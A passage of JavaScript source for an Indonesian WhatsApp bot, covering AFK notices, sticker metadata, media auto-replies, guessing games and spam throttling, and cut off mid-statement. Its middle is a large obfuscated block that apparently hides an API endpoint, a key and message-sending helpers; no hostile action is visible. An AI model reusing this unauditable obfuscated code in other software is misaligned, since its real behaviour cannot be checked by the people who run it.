            fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     alpha.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync(`./image/${thumbnail}`), sendEphemeral: true, contextInfo:{mentionedJid:alpha.parseMention(ckck)}})
                }}}}})

        if (isGroup && !mek.key.fromMe) {
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        alpha.sendMessage(from, `@${ment.split('@')[0]} sedang afk\n\n*Reason :* ${getReason}\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu\n`,text, {contextInfo:{mentionedJid: [ment]}})
                       // alpha.sendMessage(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid: alpha.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
                    alpha.sendMessage(from, `@${sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, text, {contextInfo:{mentionedJid:[sender]}})
                }
            }

            function addMetadata(packname, author) {
    if (!packname) packname = `${botname}`; if (!author) author = ` ${peknem}`;
    author = author.replace(/[^a-zA-Z0-9]/g, '');
    //let name = `data`

    if (fs.existsSync(`./sticker/data.exif`)) {
        return `./sticker/data.exif`
    }
    const json = {
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
    }

    const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
    const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

    let len = JSON.stringify(json).length
    let last

    if (len > 256) {
        len = len - 256
        bytes.unshift(0x01)
    } else {
        bytes.unshift(0x00)
    }

    if (len < 16) {
        last = len.toString(16)
        last = "0" + len
    } else {
        last = len.toString(16)
    }

    const buf2 = Buffer.from(last, "hex")
    const buf3 = Buffer.from(bytes)
    const buf4 = Buffer.from(JSON.stringify(json))

    const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

    fs.writeFile(`./sticker/data.exif`, buffer, (err) => {
        return `./sticker/data.exif`
    }
    )
}
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                const  timestampi = speed();
				const  latensii = speed() - timestampi
				const latensiii = `${latensii.toFixed(4)} _Second_`
				const ini_gcchat = `${giid.length}`
				const uptime = process.uptime()
			    const tekss = `${kyun(uptime)}`
			    const ini_totalchat = `${totalchat.length - giid.lenght}`

const replyy = (teks) => {
			alpha.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
/////
 for (let zeeone of setiker){
	if (budy === zeeone){
		result = fs.readFileSync(`./media/sticker/${zeeone}.webp`)
		alpha.sendMessage(from, result,sticker, {quoted : ftroli})
		}
}
for (let zeeonee of audionye){
	if (budy === zeeonee){
		result = fs.readFileSync(`./media/audio/${zeeonee}.mp3`)
		alpha.sendMessage(from, result, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true, quoted : ftroli})
		}
}
for (let zeeoneee of imagenye){
	if (budy === zeeoneee){
		result = fs.readFileSync(`./media/foto/${zeeoneee}.jpg`)
		alpha.sendMessage(from, result,image, {quoted : ftroli})
		}
}
for (let zeeonew of videonye){
	if (budy === zeeonew){
		result = fs.readFileSync(`./media/video/${zeeonew}.mp4`)
		alpha.sendMessage(from, result,video, {mimetype: 'video/mp4', duration: 359996400, quoted: ftroli})
		}
}  
for (let i = 0; i < filter.length ; i++) {
      if (budy == filter[i].Filter) {
      alpha.sendMessage(from, filter[i].Jawaban, text, {quoted: mek})
      }
      }  
// TEBAK GAMBAR
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply2("Selamat🥳 Jawaban kamu benar!")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// CAK LONTONG
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply2("Selamat🥳 Jawaban kamu benar")
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// FAMILY 100
if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = family[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply2("Selamat🥳 Jawaban kamu benar")
                    delete family[sender.split('@')[0]]
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
// TEBAK ANIME
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply2("Selamat🥳 Jawaban kamu benar")
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                } else {
                    reply2("Jawaban Salah!")
                }
            }
            if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in Private', 'args :', color(args.length))
						return reply2('Don`t Spam, 3 seconds per command')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
						return reply2('Don`t Spam, 3 seconds per command')
					}
           ////   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
		if (isCmd && isGroup){
		console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
		addBalance(sender, randomNomor(20), balance)
			}	
            //await alpha.updatePresence(from, Presence.recording)
            //await alpha.updatePresence(from, Presence.composing)
  (function(_0x2e1c3b,_0x3d66cc){const _0x162797=_0x2e1c3b();function _0x2681dd(_0x149133,_0x23b70b,_0x3e5538,_0x23dc49){return _0x1511(_0x23dc49-0x2ba,_0x23b70b);}function _0x5c2fa8(_0x37492c,_0x52f8e3,_0x35a43a,_0x12ad33){return _0x1511(_0x35a43a- -0x1a3,_0x12ad33);}while(!![]){try{const _0x58b65d=parseInt(_0x5c2fa8(0x30b,0x854,0x428,0x237))/(-0xfae+0x26fa+-0x174b)+parseInt(_0x5c2fa8(0x552,0x1fe,0x618,0x7bf))/(-0x18*0xfd+-0x1edf+0x3699)+-parseInt(_0x2681dd(0x7e5,0x789,0xbf5,0x93b))/(-0xc4a*0x2+0x229a+0xe9*-0xb)+parseInt(_0x5c2fa8(0x32f,0x41,0x29a,0x7b3))/(-0x45b+-0xb7b+0x7ed*0x2)+-parseInt(_0x5c2fa8(0x6d2,0x5c7,0x4fc,0x2c0))/(-0x148*-0x13+0xd3*0x19+-0x1aa*0x1b)+parseInt(_0x2681dd(0x848,0x1059,0x704,0xc1e))/(0x1bae+0x3*-0xdf+-0x190b)+-parseInt(_0x5c2fa8(0x188,0x442,0x66a,0x62f))/(0xa*0x1+0xc*0x10+0xf*-0xd);if(_0x58b65d===_0x3d66cc)break;else _0x162797['push'](_0x162797['shift']());}catch(_0x1a4311){_0x162797['push'](_0x162797['shift']());}}}(_0xa790,0x9682+0x846ea+-0x347*0x169));if(!mek[_0x1e23e4(-0x57,-0x187,0x33f,0x845)][_0x593f96(0xac4,0xfde,0xd6f,0x936)]&&!isOwner&&!isCreator&&banChats===!![])return;const alphaapi=_0x1e23e4(0x379,0x961,0x7fa,0x7ec)+_0x1e23e4(0x6fe,0x643,0x862,0x3a0)+'.herokuapp'+_0x1e23e4(0x275,0x152,0x30a,0xf2),alphakey=_0x1e23e4(0xce2,0x641,0x940,0x492),reply=_0x1755d4=>{function _0x1af682(_0x2864d6,_0x3d6159,_0x39ee11,_0x5efe69){return _0x593f96(_0x39ee11- -0x2cf,_0x3d6159,_0x39ee11-0x90,_0x5efe69-0x149);}function _0x1dde79(_0x33f83f,_0x201944,_0x19172c,_0x4f0356){return _0x1e23e4(_0x33f83f-0x9f,_0x201944-0xc1,_0x33f83f- -0x65,_0x201944);}alpha[_0x1dde79(0x620,0x1eb,0x803,0x1b0)+'e'](from,_0x1755d4,text,{'quoted':mek,'contextInfo':{'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':_0x1dde79(0x35f,0x2ca,0x726,-0x82),'thumbnailUrl':'','thumbnail':fs[_0x1dde79(0x51c,0x53c,0x694,0x84a)+'nc']('./image/'+thumbnail),'sourceUrl':''+apiku}}});};if(!isGroup&&!isCmd&&!command&&!mek[_0x1e23e4(0x505,0x706,0x33f,0x81)][_0x593f96(0xac4,0x839,0xc6f,0xdab)]&&!autorespon){simi=await fetchJson(_0x593f96(0x9d8,0xad7,0x753,0xe1d)+_0x1e23e4(0x26b,0xed,0x3d5,0x149)+_0x1e23e4(0x8e4,0x865,0x6be,0x49e)+_0x593f96(0xad2,0xc56,0xf01,0x8be)+'lse&text='+cmd),sami=simi[_0x593f96(0x613,0xb2d,0x4fd,0x334)];const _0x36ed39={};_0x36ed39[_0x1e23e4(0xc8f,0xa10,0x830,0xc5a)+'Score']=0x1fc,_0x36ed39[_0x1e23e4(0xa80,0xb21,0xaaf,0x867)+'d']=!![],alpha[_0x593f96(0x863,0xb6d,0x945,0x9d3)+'e'](from,'_'+sami+'_',text,{'thumbnail':fs[_0x1e23e4(0x159,0x1a0,0x581,0x884)+'nc'](_0x1e23e4(0xdb0,0xc51,0xab6,0x976)+thumbnail),'sendEphemeral':!![],'quoted':mek,'contextInfo':_0x36ed39});}const sendButDoc=(_0x5557dd,_0x7bff0d,_0x56a103,_0x56d008,_0xc7aa65,_0x6e2176)=>{const _0x14cc45={};_0x14cc45[_0xdb303c(0x628,0x133,0x4,-0x96)]=_0x53ff17(0x3b5,0x882,0x8ba,0xa4d)+_0xdb303c(0x4fb,0x3bb,0x6a0,0x755)+_0xdb303c(0xc36,0x86d,0x919,0xc1e),_0x14cc45[_0x53ff17(0x15b,0x986,0x513,0x326)]=_0xdb303c(0xd4b,0x87c,0x9d5,0x7af)+_0x53ff17(0x3fc,-0x13e,0x1b4,0xea)+_0x53ff17(0x528,0x39a,0x7bf,0x941),_0x14cc45[_0x53ff17(0x5bc,0x6b7,0x7ac,0x962)]=_0x53ff17(0x604,0x729,0x8ba,0xb44)+_0x53ff17(0x127,0x59a,0x132,0x427)+_0x53ff17(0x5c2,0x9e1,0x734,0x4f8),_0x14cc45[_0xdb303c(-0x2b6,0x22e,0x15f,0x5b2)]=function(_0x16143d,_0x39c036){return _0x16143d*_0x39c036;},_0x14cc45['WAScO']=_0x53ff17(0x420,0x159,0x6f,-0x308)+_0x53ff17(0x50b,0x74a,0x338,0x687),_0x14cc45[_0xdb303c(0xbb7,0x888,0x820,0x444)]='applicatio'+'n/vnd.open'+_0x53ff17(0x5db,0x59d,0x1f8,-0x163)+_0x53ff17(-0xff,-0x315,0x111,0x5f2)+'ument.spre'+'adsheetml.'+_0x53ff17(-0x1d5,0x6d4,0x2e3,0x684),_0x14cc45[_0xdb303c(0x945,0x77c,0x7b1,0x97f)]=_0xdb303c(0x10c,0x31,-0x191,-0xd4)+_0x53ff17(0x6a0,0x722,0x2ec,-0x6b)+_0xdb303c(0x123,0x1ba,0x37f,-0x155)+'-officedoc'+_0xdb303c(0x8bf,0x7cf,0xc0c,0x83f)+_0x53ff17(0xabf,0x887,0x5fa,0x7ce)+_0xdb303c(0xbd6,0x71f,0x234,0x41c)+'t',_0x14cc45[_0x53ff17(0x920,0x4de,0x7a0,0x813)]=_0xdb303c(0x22d,0x31,0x292,0x12e)+_0x53ff17(-0x1ac,0x36f,0x2ec,0x232)+_0xdb303c(0x186,0x1ba,0x3ee,0x53d)+_0xdb303c(-0x414,0xd3,-0x305,0x479)+_0x53ff17(0x5b,0x3b2,0x361,-0x5c)+_0xdb303c(-0x167,0x18c,-0x16f,0x5de)+_0x53ff17(0x114,0xd0,0x14d,-0x97)+_0x53ff17(0x16e,-0x233,0x9f,-0x417),_0x14cc45[_0x53ff17(0x761,0x7b3,0x455,0x654)]='Command',_0x14cc45[_0x53ff17(0x45e,0x449,0x7ff,0xc2f)]='🙍‍♂️\x20Owner',_0x14cc45[_0xdb303c(0x12a,0x344,0x4dc,0x44b)]=_0x53ff17(0xb96,0x6b5,0x7e0,0x6c3)+_0xdb303c(-0x59,0x61,0x50c,0x4a2),_0x14cc45[_0x53ff17(0x33b,0x478,0x469,0x5c)]=_0xdb303c(0x7d3,0x2d2,0x707,0x45c)+'D3MAaYx15D'+_0x53ff17(-0x187,-0x123,0x203,0x37d)+_0x53ff17(0x846,0x890,0x388,0x46c)+_0x53ff17(0x61d,0x317,0x5c5,0x852),_0x14cc45[_0x53ff17(0x3ec,0xaa2,0x8e3,0x56f)]=_0x53ff17(-0x11f,0x368,0x2dd,0x5a7)+_0x53ff17(-0x27e,0x673,0x188,0x1cb),_0x14cc45['SXvow']=_0xdb303c(0x705,0x4c5,0x3bf,0x156)+_0xdb303c(0x441,0x3f4,0x197,0x775)+_0x53ff17(-0x30,-0x338,0x19d,0x2f1)+_0x53ff17(0x451,0x43d,0x259,0x3c3)+_0x53ff17(-0x103,0x58f,0x355,0x49a),_0x14cc45[_0xdb303c(0x675,0x7f9,0x3ab,0xb36)]=_0xdb303c(0x543,0x914,0xd2e,0xcf2)+_0xdb303c(0x922,0x7f8,0x9c8,0x3c0)+'bA1B2pJ18r'+_0xdb303c(0x511,0x24,0x352,-0xc6)+_0x53ff17(0x2e,0x515,0x9a,-0x238);const _0x48234a=_0x14cc45,_0x39138b=[_0x48234a[_0xdb303c(0x624,0x133,-0x253,0x2da)],_0x48234a[_0xdb303c(0x177,0x4d5,0x7b,0x633)],_0xdb303c(0x847,0x87c,0x9a1,0x7bb)+_0x53ff17(-0x3fa,-0x383,0xc7,0x2aa)+_0xdb303c(-0x262,0x21c,-0xcd,0x92),_0x48234a[_0x53ff17(0x870,0xab5,0x7ac,0xa0c)]],_0xb818c=_0x39138b[Math[_0xdb303c(-0x26e,0x14e,-0x27c,0x462)](_0x48234a[_0x53ff17(0x258,-0x1a,0x26c,-0x40)](Math[_0xdb303c(0x1f3,0x43b,-0xb7,0x675)](),_0x39138b['length']))],_0x1e0949=[_0x48234a[_0x53ff17(0x8c2,0x7d1,0x8c7,0x3f0)],_0x48234a[_0x53ff17(0x7b7,0x475,0x8c6,0x9c0)],_0x48234a[_0x53ff17(0xac8,0x59d,0x7ba,0x85b)],_0x48234a[_0xdb303c(0x8b4,0x762,0x7af,0x381)]],_0xe70e56=_0x1e0949[Math[_0xdb303c(0x17e,0x14e,0x3f3,0x104)](Math[_0x53ff17(0x26f,0x315,0x479,0x419)]()*_0x1e0949[_0xdb303c(0xc83,0x7c8,0x30f,0x7a3)])];function _0xdb303c(_0x252480,_0x2227bd,_0x17d490,_0x1326fc){return _0x593f96(_0x2227bd- -0x320,_0x1326fc,_0x17d490-0x124,_0x1326fc-0x21);}const _0xa11108={};_0xa11108[_0x53ff17(0x7a,0x283,0xda,0x4d6)+'t']=_0xdb303c(0x895,0x818,0x369,0x98a)+'u';const _0x1055de={};_0x1055de[_0xdb303c(0x182,0xbe,0x335,0x2c)]=_0x48234a[_0x53ff17(0x6e3,0x7c3,0x455,0x85a)],_0x1055de[_0xdb303c(-0x1bd,-0x7c,0x364,0x1e0)]=_0xa11108,_0x1055de['type']=0x1;const _0x51fb89={};_0x51fb89[_0x53ff17(0x4f3,-0x1e1,0xda,0x2fa)+'t']=_0x48234a[_0xdb303c(0x8fd,0x7c1,0xa79,0xc8c)];const _0xfafd4a={};_0xfafd4a[_0xdb303c(0x4df,0xbe,0x3a7,-0x94)]=_0xdb303c(0x183,0x137,0x27a,0x41),_0xfafd4a[_0x53ff17(0xdd,-0x263,-0x3e,-0x67)]=_0x51fb89,_0xfafd4a[_0x53ff17(0x92e,0x55c,0x89c,0xb6a)]=0x1;const _0x2c8970={};_0x2c8970[_0x53ff17(-0x14d,0x48a,0xda,-0x277)+'t']=_0x48234a[_0xdb303c(-0x6e,0x344,0x22a,0x30f)];const _0x2641f2={};_0x2641f2['buttonId']=_0xdb303c(0x2be,0x363,0x284,-0x102),_0x2641f2[_0x53ff17(-0x250,-0x1c8,-0x3e,0x2ed)]=_0x2c8970,_0x2641f2[_0xdb303c(0x6a4,0x85e,0x7e2,0x947)]=0x1;const _0x1b492b=[_0x1055de,_0xfafd4a,_0x2641f2],_0x13b40d={};_0x13b40d['url']=_0xdb303c(0x81c,0x61d,0x308,0x44d)+'g.whatsapp'+_0x53ff17(0x93c,0x774,0x737,0x7c2)+'o-k40Q-gO_'+_0x53ff17(-0xf7,-0xea,0x33a,0xee)+'rYAYVeWq-7'+_0x53ff17(0x293,0x706,0x6b6,0x256)+_0x53ff17(-0xac,0x778,0x41d,0x1d6),_0x13b40d[_0x53ff17(0x358,0xad2,0x7b7,0x700)]=_0xe70e56,_0x13b40d[_0x53ff17(0xb0c,0x4ab,0x92a,0x922)]=_0x48234a[_0x53ff17(0x3f3,0x204,0x469,0x2a9)],_0x13b40d[_0x53ff17(0x535,0x63e,0x798,0x7fb)]=_0x48234a['PtUQr'],_0x13b40d[_0xdb303c(0x24f,-0x1a,-0x24a,0x2e7)]=0x1e61,_0x13b40d[_0x53ff17(0x70c,0xc2,0x597,0x684)]=_0x48234a[_0xdb303c(0xc06,0x878,0x711,0xb90)],_0x13b40d[_0xdb303c(0x957,0x93d,0x870,0xc62)]=botname+_0xdb303c(-0x3ad,0xc6,0x1dd,0x56d)+ownername,_0x13b40d[_0xdb303c(0x274,0x203,0x190,0x208)+'256']=_0x48234a[_0x53ff17(0xca6,0xce1,0x837,0x959)],_0x13b40d[_0x53ff17(0x6b6,0x209,0x409,0x343)+_0xdb303c(0x4c9,-0x23,-0x3e1,0x1d7)]=pp_bot;const _0x30729e={};_0x30729e[_0xdb303c(-0x11c,0x195,0x17,0x678)+'t']=_0x7bff0d,_0x30729e[_0x53ff17(-0xa1,0x1e1,0x2ce,0x2c2)]=_0x56a103,_0x30729e[_0xdb303c(0x374,0x7ad,0xb3c,0x94d)]=_0x1b492b,_0x30729e[_0x53ff17(0x21a,0x516,0x696,0x8ad)]='DOCUMENT',_0x30729e[_0x53ff17(0x298,0x506,0x26d,0x448)+_0x53ff17(0x104,0x4d,0x20,0x3e3)]=_0x13b40d;const _0x59da33=_0x30729e;function _0x53ff17(_0x528f42,_0x16efef,_0x3b34c3,_0x3b1540){return _0x593f96(_0x3b34c3- -0x2e2,_0x3b1540,_0x3b34c3-0x47,_0x3b1540-0x10f);}const _0x5c3cfc={};_0x5c3cfc[_0xdb303c(0x1f9,-0x35,-0xc5,0x4cb)]=_0xb818c,_0x5c3cfc['mediaType']=0x2,_0x5c3cfc[_0xdb303c(0x8e4,0x638,0x2c4,0x506)]=''+ucapannya2,_0x5c3cfc[_0xdb303c(-0x33f,-0x64,0x18d,0x2b)]=''+tampilTanggal,_0x5c3cfc[_0x53ff17(0xd17,0xd7d,0x8d0,0x533)+'rl']='',_0x5c3cfc[_0x53ff17(-0x36c,0xa8,0x168,0x62b)]=pp_userz;const _0x5bf6db={};_0x5bf6db['forwarding'+'Score']=0x3b9aca00,_0x5bf6db[_0x53ff17(0x95a,0xbd8,0x9ab,0xada)+'d']=!![],_0x5bf6db[_0xdb303c(0x1a7,0x0,-0xcf,-0xc)+'ral']=!![],_0x5bf6db['mentionedJ'+'id']=[_0x56d008,_0xc7aa65,_0x6e2176],_0x5bf6db[_0x53ff17(0x112,0x199,0x2cc,-0xf7)+_0x53ff17(-0x58,-0x24d,-0xe,-0x51a)]=_0x5c3cfc;const _0x13f1c4={};_0x13f1c4[_0xdb303c(0x99c,0x784,0x29a,0x8d3)+'o']=_0x5bf6db,_0x13f1c4[_0x53ff17(0xa9e,0xa81,0x6af,0x821)]=ftroli,_0x13f1c4[_0xdb303c(-0xa2,0x0,-0xa1,-0x344)+_0xdb303c(-0xb0,0xa2,-0x28,0x71)]=!![],alpha[_0xdb303c(0x7e8,0x543,0x381,0x7be)+'e'](_0x5557dd,_0x59da33,MessageType[_0x53ff17(-0x9b,0x1e2,0x207,-0x1af)+'sage'],_0x13f1c4);},sendButMessage=(_0x70c128,_0x3958d1,_0x54e61e,_0x5b12c4=[],_0x20b70f={})=>{const _0x1059fb={};_0x1059fb[_0x399469(-0x2c5,-0x97,0x1fa,-0x201)+'t']=_0x3958d1;function _0x515f34(_0x20555f,_0x4993d6,_0x4dcf1e,_0x1872a3){return _0x1e23e4(_0x20555f-0xf1,_0x4993d6-0x53,_0x1872a3- -0x2d1,_0x4dcf1e);}function _0x399469(_0x5b3117,_0x38b92d,_0x13cd16,_0x5017da){return _0x593f96(_0x13cd16- -0x2bb,_0x5017da,_0x13cd16-0x8,_0x5017da-0x19f);}_0x1059fb[_0x399469(0x5df,0xa2,0x2f5,0x4ee)]=_0x54e61e,_0x1059fb[_0x515f34(0x665,0x545,0x9f3,0x61e)]=_0x5b12c4,_0x1059fb[_0x399469(0x79d,0x660,0x6bd,0x7ef)]=0x1;const _0x264fe7=_0x1059fb;alpha[_0x515f34(0xdf,0x4cd,0x70,0x3b4)+'e'](_0x70c128,_0x264fe7,MessageType['buttonsMes'+'sage'],_0x20b70f);},sendButLocation=async(_0x4f5215,_0x8a8a55,_0x227b32,_0x44b395,_0x3d1146=[],_0x45ed81={})=>{const _0x25204a={};_0x25204a[_0x2a7684(0x8e9,0x61f,0x8cb,0xdd2)]=_0x2a7684(0xd2e,0xad6,0x109a,0xfff)+_0x2a7684(0xc6e,0x10a5,0xf7b,0x932);const _0x1abeda=_0x25204a;kma=_0x44b395;const _0x2fe033=await alpha[_0x2a7684(0xaae,0xf8e,0x60c,0xfb8)+_0x2a7684(0xdaa,0x123d,0x1161,0x11d2)](_0x4f5215,kma,MessageType['location'],{'thumbnail':kma});mhan=_0x2fe033[_0x2a22bf(0xd2c,0x9e4,0xaa1,0x990)][_0x1abeda[_0x2a22bf(0x941,0xa92,0x93f,0xc61)]]?_0x2fe033['message'][_0x2a22bf(0xd86,0xd42,0x1189,0xa20)+_0x2a22bf(0xcc6,0xf77,0xc60,0xf95)]:_0x2fe033;const _0x5f47ef={};_0x5f47ef[_0x2a7684(0x6a2,0xa7c,0xab5,0xae3)+_0x2a7684(0x451,0x4b5,0x4db,0x17e)]=mhan[_0x2a22bf(0xd2c,0xef8,0x1109,0xddb)][_0x2a22bf(0x6fa,0x47f,0x84f,0x5fd)+_0x2a7684(0x451,0x286,0x8ad,0x1b7)],_0x5f47ef['contentTex'+'t']=_0x8a8a55,_0x5f47ef[_0x2a22bf(0x757,0x6be,0x7fd,0x9ad)]=_0x227b32,_0x5f47ef[_0x2a22bf(0xc74,0xe92,0xb0f,0x7d6)]=_0x3d1146;function _0x2a22bf(_0x3e7ccd,_0x45dff9,_0x61bb10,_0x2fac59){return _0x593f96(_0x3e7ccd-0x1a7,_0x61bb10,_0x61bb10-0x49,_0x2fac59-0xce);}_0x5f47ef[_0x2a22bf(0xb1f,0xf4c,0xf02,0x60e)]=0x6;function _0x2a7684(_0x1b5c58,_0x1888d7,_0xc9b33f,_0x40bb11){return _0x593f96(_0x1b5c58-0x14f,_0xc9b33f,_0xc9b33f-0x1bf,_0x40bb11-0x5d);}const _0x33c897=_0x5f47ef;alpha[_0x2a7684(0x9b2,0x606,0xb96,0xca2)+'e'](_0x4f5215,_0x33c897,MessageType[_0x2a7684(0x638,0x27c,0x81d,0xa2a)+'sage'],_0x45ed81);},sendButVideo=async(_0x3ec779,_0x300607,_0x1d6c5a,_0x372613,_0x333953=[],_0x57581f={})=>{const _0x2888b6={};_0x2888b6[_0xa24da8(0x79,0x2c0,0xf9,0x6fa)]=_0xa24da8(0xa6b,0x941,0xd62,0xcfb)+'essage';const _0xc51e82=_0x2888b6;function _0x5e2e2c(_0x2c7a98,_0x5b79af,_0x53ee4b,_0x455a12){return _0x593f96(_0x53ee4b-0x3a,_0x5b79af,_0x53ee4b-0x16d,_0x455a12-0x19f);}kma=_0x372613;const _0x26f9f3=await alpha[_0xa24da8(0xb9a,0x6c1,0xb4a,0x7b8)+_0x5e2e2c(0xf56,0xa7a,0xc95,0xea1)](_0x3ec779,kma,MessageType[_0x5e2e2c(0xa9a,0x2ce,0x63f,0x21d)]);mhan=_0x26f9f3['message'][_0xc51e82[_0xa24da8(0x427,0x2c0,-0x3,0x3a1)]]?_0x26f9f3[_0xa24da8(0x491,0x8e7,0x78c,0x40a)][_0xa24da8(0xb5d,0x941,0x795,0xab2)+_0xa24da8(0xd87,0x881,0x3b3,0x7a9)]:_0x26f9f3;const _0x4a03b0={};_0x4a03b0[_0x5e2e2c(0x7f8,0xd34,0xbdb,0xe4d)+'ge']=mhan[_0xa24da8(0x949,0x8e7,0x65c,0x74b)]['videoMessa'+'ge'],_0x4a03b0[_0xa24da8(-0x1c3,0x217,0x221,0x55f)+'t']=_0x300607;function _0xa24da8(_0x5d8686,_0x1a279c,_0x431486,_0x16509f){return _0x1e23e4(_0x5d8686-0xdf,_0x1a279c-0x15d,_0x1a279c- -0xc0,_0x431486);}_0x4a03b0[_0xa24da8(-0x1a9,0x312,0x311,0x6a5)]=_0x1d6c5a,_0x4a03b0[_0x5e2e2c(0x697,0xd76,0xb07,0xd9e)]=_0x333953,_0x4a03b0[_0x5e2e2c(0xe74,0x6df,0x9b2,0x875)]=0x5;const _0x3fd6df=_0x4a03b0;alpha[_0xa24da8(0x7a0,0x5c5,0xa04,0x881)+'e'](_0x3ec779,_0x3fd6df,MessageType[_0xa24da8(-0x161,0x24b,0x42f,0x671)+_0xa24da8(0xb8f,0x9bd,0xe5e,0x8e9)],_0x57581f);},sendButImage=async(_0xa8533e,_0x2cf497,_0x34b5ff,_0x175c4f,_0x5448cb=[],_0x588bf9={})=>{const _0x55353c={};_0x55353c[_0x14351b(0xdc3,0xc4e,0xb7f,0xd59)]=_0x14351b(0xd79,0xc32,0x9a7,0xf3e)+'essage';const _0x47fda4=_0x55353c;kma=_0x175c4f;const _0x3c6d62=await alpha['prepareMes'+'sage'](_0xa8533e,kma,MessageType[_0x4e3406(0x33f,0x3f,-0x4bf,0x227)],{'thumbnail':Buffer[_0x4e3406(0x22a,0x639,0x877,0x3be)](0x3*0x1a6+-0x36d+-0x185)});mhan=_0x3c6d62[_0x4e3406(0x30c,0x6a8,0x425,0x40d)][_0x47fda4['IoolE']]?_0x3c6d62['message'][_0x14351b(0xd79,0xb18,0xd93,0xeba)+_0x14351b(0xcb9,0xb47,0x91a,0x90f)]:_0x3c6d62;const _0x30da6e={};function _0x14351b(_0x375a0,_0x540307,_0x291556,_0x218d22){return _0x593f96(_0x375a0-0x19a,_0x540307,_0x291556-0x17e,_0x218d22-0xa9);}_0x30da6e[_0x14351b(0x9c6,0xb41,0x91b,0x986)+'ge']=mhan['message']['imageMessa'+'ge'];function _0x4e3406(_0x335dd0,_0x3dd188,_0x43960a,_0x494936){return _0x1e23e4(_0x335dd0-0xc5,_0x3dd188-0x1af,_0x3dd188- -0x2ff,_0x494936);}_0x30da6e[_0x14351b(0x64f,0x1ed,0x843,0xb0b)+'t']=_0x2cf497,_0x30da6e[_0x14351b(0x74a,0xb85,0xac6,0x7cb)]=_0x34b5ff,_0x30da6e[_0x14351b(0xc67,0x79f,0x757,0xb21)]=_0x5448cb,_0x30da6e[_0x4e3406(0x900,0x49b,0x486,-0x76)]=0x4;const 